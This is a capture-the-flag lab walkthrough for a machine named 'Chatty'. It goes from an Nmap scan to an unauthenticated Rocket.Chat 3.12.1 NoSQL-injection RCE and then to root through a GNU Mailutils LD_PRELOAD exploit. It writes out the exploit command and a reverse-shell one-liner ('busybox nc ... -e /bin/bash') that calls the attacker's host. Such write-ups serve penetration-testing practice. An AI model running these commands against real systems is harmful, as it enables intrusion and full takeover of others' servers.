---
icon: ubuntu
---

# Chatty - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.225.164 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-30 22:47 EDT
Nmap scan report for 192.168.225.164
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: sameorigin
|     X-Instance-ID: CFoDZNbRwXk2bWd8q
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Wed, 01 Oct 2025 02:48:38 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/789f2fee702e2a6a62ec245003ce4734eeec6f9a.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|_    <meta name="mobile-web-app-capable" cont
```

Only 2 ports open 22 ssh and 3000 ?

### <mark style="color:$primary;">HTTP Port 3000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1017).png" alt=""><figcaption></figcaption></figure>

Upon visiting we see rocket.chat. I did try Directory busting but it came back with a lot of false positives. Searchsploit did reveal 2 RCE for Rocket Chat version 3.12.1

<figure><img src="../../.gitbook/assets/image (1018).png" alt=""><figcaption></figcaption></figure>

Now let's see if I can find the version that is running on this one. After some google FU I came across this [**website**](https://developer.rocket.chat/docs/contribute-through-bug-reporting?highlight=api%2Finfo) that describes in details about rocket.chat's endpoints that one that stood out to me was this one

<figure><img src="../../.gitbook/assets/image (1019).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1020).png" alt=""><figcaption></figcaption></figure>

And it works! Ok it's confirmed this version is vulnerable to NOSQLI RCE \[Unauthenticated]

### <mark style="color:$primary;">Rocket.Chat v 3.12.1 - NOSQLI RCE (Unauthenticated)</mark>

I am going to download the exploit we found earlier

```
searchsploit -m 50108
```

Before we can use this exploit, I am going to need the administrator's email. I am going to register an account and hopefully it pops up somewhere on the site

<figure><img src="../../.gitbook/assets/image (1021).png" alt=""><figcaption></figcaption></figure>

Upon registering and account I actually got a message from the admin with his email address.&#x20;

Now I need to make a couple of adjustments to the exploi: I created a low priv user so I will comment that part out

<figure><img src="../../.gitbook/assets/image (1022).png" alt=""><figcaption></figcaption></figure>

I also need to change the password of the low priv user to the one I setup

<figure><img src="../../.gitbook/assets/image (1023).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1024).png" alt=""><figcaption></figcaption></figure>

```
python3 50108.py -u 'deimos@gmail.com' -a 'admin@chatty.offsec' -t 'http://192.168.225.164:3000'
```

<figure><img src="../../.gitbook/assets/image (1025).png" alt=""><figcaption></figcaption></figure>

ok it worked, and code execution seems to work as well even though we can't see the output. I am going to try and get a shell with nc

```
busybox nc 192.168.45.158 3000 -e /bin/bash
```

<figure><img src="../../.gitbook/assets/image (1026).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1027).png" alt=""><figcaption></figcaption></figure>

It worked! we got a shell as rocketchat!

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (1028).png" alt=""><figcaption></figcaption></figure>

it seems like there is none else besides rocketchat and root

Running Linpeas I came across an interesting SUID binary

<figure><img src="../../.gitbook/assets/image (1029).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1030).png" alt=""><figcaption></figcaption></figure>

While searching online about GNU Mailutils 3.7 I came across this [**exploit**](https://github.com/bcoles/local-exploits/tree/master/CVE-2019-18862) I am going to download <mark style="color:$info;">**exploit.ldpreload.sh**</mark> to my machine

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

I download it <mark style="color:$info;">**exploit.ldpreload.sh**</mark> to the target machine made it executable and ran it. Even though it look like it failed it created an <mark style="color:$info;">**sh binary in /var/tmp**</mark>

<figure><img src="../../.gitbook/assets/image (1032).png" alt=""><figcaption></figcaption></figure>

From there all I had to do was execute it and I got root!
